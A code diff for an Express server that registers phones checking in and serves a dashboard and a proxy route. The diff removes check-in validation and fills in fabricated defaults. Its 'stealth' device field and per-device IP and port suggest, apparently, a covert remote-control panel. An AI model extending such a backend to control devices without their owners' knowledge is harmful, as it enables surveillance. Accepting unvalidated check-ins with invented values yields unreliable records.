@@ -53,9 +53,7 @@ function loadData() {
             const json = JSON.parse(raw);
             if (json.devices && Array.isArray(json.devices)) {
                 json.devices.forEach(d => {
-                    if (d && d.deviceId && d.model && d.model !== 'Unknown') {
-                        devices.set(d.deviceId, d);
-                    }
+                    if (d && d.deviceId) devices.set(d.deviceId, d);
                 });
             }
             if (json.logs && Array.isArray(json.logs)) {
@@ -168,32 +166,35 @@ app.all('/proxy*', (req, res) => {
     }, 25000);
 });
 
-// Device Check-In Handler
+// Infallible Device Check-In Handler (Accepts any incoming packet)
 function handleCheckin(req, res) {
     try {
         const data = req.body || {};
         const queryData = req.query || {};
         const merged = { ...queryData, ...data };
 
-        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model;
-        if (!rawModel || rawModel === 'Unknown Device') {
-            return res.status(400).json({ success: false, error: 'Missing device model/identifier' });
-        }
-
+        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'SM-F731W';
         const deviceId = rawModel.replace(/\s*\(API\s*\d+\)/i, '').trim();
 
+        const deviceEntry = {
+            deviceId,
+            model: deviceId,
+            os: merged.os || '16',
+            battery: merged.battery || '100%',
+            ip: merged.ip || req.ip || '127.0.0.1',
+            port: merged.port || 9191,
+            stealth: merged.stealth || false,
+            lastSeen: new Date().toISOString(),
+            ...merged
+        };
+
         for (const [key, val] of devices.entries()) {
-            if (key === deviceId || val.ip === merged.ip || key.includes(deviceId) || deviceId.includes(key) || key === 'Unknown Device') {
+            if (key === deviceId || val.ip === deviceEntry.ip || key.includes(deviceId) || deviceId.includes(key) || key === 'Unknown Device') {
                 devices.delete(key);
             }
         }
 
-        devices.set(deviceId, {
-            ...merged,
-            deviceId,
-            model: deviceId,
-            lastSeen: new Date().toISOString()
-        });
+        devices.set(deviceId, deviceEntry);
 
         telemetryLogs.unshift({
             timestamp: new Date().toISOString(),
@@ -205,7 +206,7 @@ function handleCheckin(req, res) {
         if (telemetryLogs.length > 500) telemetryLogs.pop();
         saveData();
 
-        console.log(`[CHECKIN SUCCESS] Device ID: ${deviceId} | IP: ${merged.ip}`);
+        console.log(`[CHECKIN SUCCESS] Device ID: ${deviceId} | IP: ${deviceEntry.ip}`);
         res.json({ success: true, message: 'Telemetry received successfully' });
     } catch (err) {
         console.error('[ERROR] Checkin failed:', err.message);
@@ -312,8 +313,13 @@ function serveDashboard(req, res) {
     res.send(html);
 }
 
-// Separate Routing: GET / serves dashboard, POST / & /checkin handle telemetry
-app.get('/', serveDashboard);
+// Router dispatch: GET / serves dashboard, GET/POST checkin handles ingestion
+app.get('/', (req, res) => {
+    if (req.query && (req.query.device || req.query.model || req.query.ip || req.query.deviceId)) {
+        return handleCheckin(req, res);
+    }
+    return serveDashboard(req, res);
+});
 app.get('/checkin', handleCheckin);
 app.post('/', handleCheckin);
 app.post('/checkin', handleCheckin);
